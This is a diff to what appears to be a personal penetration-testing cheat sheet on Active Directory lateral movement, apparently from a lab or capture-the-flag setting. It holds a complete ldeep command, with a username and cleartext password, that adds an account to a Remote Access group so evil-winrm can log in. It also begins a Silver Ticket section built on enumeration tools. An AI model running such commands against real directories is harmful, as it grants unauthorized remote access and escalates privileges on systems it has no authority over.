@@ -29,9 +29,10 @@ want to move laterally and have low level (like svc) creds, but that user is not
 
 if creds are valid, but nxc doesn't show pwned for winrm, run ldeep:
 ```
-ldeep ldap -u tracy.white -p 'zqwj041FGX' -d nara-security.com -s ldap://nara-security.com add_to_group "CN=TRACY WHITE,OU=STAFF,DC=NARA-SECURITY,DC=COM" "CN=REMOTE ACCESS,OU=remote,DC=NARA-SECURITY,DC=COM"
+ldeep ldap -u tracy.white -p 'zqwj041FGX' -d nara-security.com -s ldap://nara-security.com add_to_group "CN=TRACY WHITE,OU=STAFF,DC=NARA-SECURITY,DC=COM" "CN=REMOTE ACCESS,OU=remote,DC=NARA-SECURITY,DC=COM" && deactivate
 ```
 - adds user to remote access group, so evil-winrm should work afterward
+- because of conflicting ldap3 python module with bloodhound, set up ldeep to run in virtual environment with alias so `&& deactivate` just exits that
 
 ***Silver Ticket***
 have low level creds, check for SID(from `enum4linux` or `lookupsid.py`) and ServicePrincipalName (from `GetUserSPNs.py`) of user to make silver ticket
